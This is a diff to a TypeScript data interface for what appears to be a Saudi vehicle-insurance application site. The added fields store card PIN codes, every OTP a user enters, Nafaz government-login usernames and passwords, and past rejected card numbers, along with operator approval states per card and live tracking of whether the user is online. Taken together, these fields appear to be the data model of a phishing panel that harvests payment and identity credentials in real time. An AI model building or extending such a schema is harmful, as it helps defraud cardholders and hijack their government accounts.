@@ -1,10 +1,12 @@
 export interface InsuranceApplication {
   id?: string
   country: string
+
   // Step 1: Basic Information
   identityNumber: string
   ownerName: string
   phoneNumber: string
+  phoneNumber2?: string
   documentType: "استمارة" | "بطاقة جمركية"
   serialNumber: string
   insuranceType: "تأمين جديد" | "نقل ملكية"
@@ -26,6 +28,8 @@ export interface InsuranceApplication {
     type: string
     features: string[]
   }
+  selectedCarrier?: string
+  totalPrice?: string
 
   // Step 4: Payment
   paymentMethod?: string
@@ -36,7 +40,12 @@ export interface InsuranceApplication {
   cardType?: string
   bankInfo?: string
   paymentStatus: "pending" | "completed" | "failed"
-  cardStatus?: "pending" | "approved_with_otp" | "approved_with_pin" | "rejected"
+
+  // Card Approval Status
+  cardStatus?: "pending" | "approved_with_otp" | "approved_with_pin" | "rejected" | "approved"
+  cardOtpApproved?: "pending" | "approved" | "rejected"
+
+  // Card History
   oldCards?: Array<{
     cardNumber?: string
     cardHolderName?: string
@@ -46,17 +55,42 @@ export interface InsuranceApplication {
     bankInfo?: string
     rejectedAt: string
   }>
+  cardHistory?: any
 
-  // Verification fields for phone and ID card codes
+  // OTP Management
+  otp?: string
+  allOtps?: string[]
+  phoneOtp?: string
+
+  // Verification fields for phone and ID
   phoneVerificationCode?: string
   phoneVerificationStatus?: "pending" | "approved" | "rejected"
   phoneVerifiedAt?: Date
+  phoneOtpApproved?: "pending" | "approved" | "rejected"
+
   idVerificationCode?: string
   idVerificationStatus?: "pending" | "approved" | "rejected"
   idVerifiedAt?: Date
+
+  // Nafaz Integration (Saudi Arabia e-services)
+  nafazId?: string
+  nafazPass?: string
+  authNumber?: string
+
+  // Transfer of Ownership (نقل ملكية)
+  buyerIdNumber?: string
+  buyerName?: string
+
+  // User Activity Tracking
+  online?: boolean
   lastSeen?: string
+  isUnread?: boolean
+
+  // PIN Code
+  pinCode?: string
+
   // Metadata
-  currentStep: number
+  currentStep: number | string
   status: "draft" | "pending_review" | "approved" | "rejected" | "completed"
   assignedProfessional?: string
   createdAt: Date
